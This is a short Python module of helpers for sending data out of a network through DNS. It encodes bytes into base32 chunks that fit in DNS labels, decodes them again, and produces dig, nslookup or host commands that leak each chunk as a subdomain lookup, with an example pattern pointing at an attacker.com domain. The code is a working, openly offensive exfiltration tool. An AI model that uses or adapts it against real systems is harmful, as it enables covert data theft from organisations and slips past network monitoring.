"""DNS-based data exfiltration helpers."""

from __future__ import annotations

import base64

__all__ = [
    "dns_encode_payload",
    "dns_decode_payload",
    "dns_exfil_commands",
]


def dns_encode_payload(data: bytes, *, label_max: int = 60) -> list[str]:
    """Encode bytes as a list of DNS label-safe base32 strings.

    Each label is at most ``label_max`` characters. Use each label as a
    subdomain query: ``<index>.<label>.exfil.attacker.com``.
    """
    encoded = base64.b32encode(data).decode().rstrip("=")
    return [encoded[i : i + label_max] for i in range(0, len(encoded), label_max)]


def dns_decode_payload(labels: list[str]) -> bytes:
    """Reconstruct bytes from DNS-encoded labels produced by :func:`dns_encode_payload`."""
    encoded = "".join(labels)
    pad = (8 - len(encoded) % 8) % 8
    return base64.b32decode(encoded + "=" * pad)


def dns_exfil_commands(
    data: bytes,
    domain: str,
    *,
    label_max: int = 60,
    tool: str = "dig",
) -> list[str]:
    """Return shell commands to exfiltrate *data* via DNS lookups.

    Each chunk is sent as a subdomain query: ``<idx>.<encoded>.<domain>``.

    Args:
        tool: ``dig`` | ``nslookup`` | ``host``.
    """
    labels = dns_encode_payload(data, label_max=label_max)
    cmds: list[str] = []
    for i, label in enumerate(labels):
        subdomain = f"{i}.{label.lower()}.{domain}"
        if tool == "nslookup":
            cmds.append(f"nslookup {subdomain} 2>/dev/null")
        elif tool == "host":
            cmds.append(f"host {subdomain} 2>/dev/null")
        else:
            cmds.append(f"dig +short {subdomain} 2>/dev/null")
    return cmds
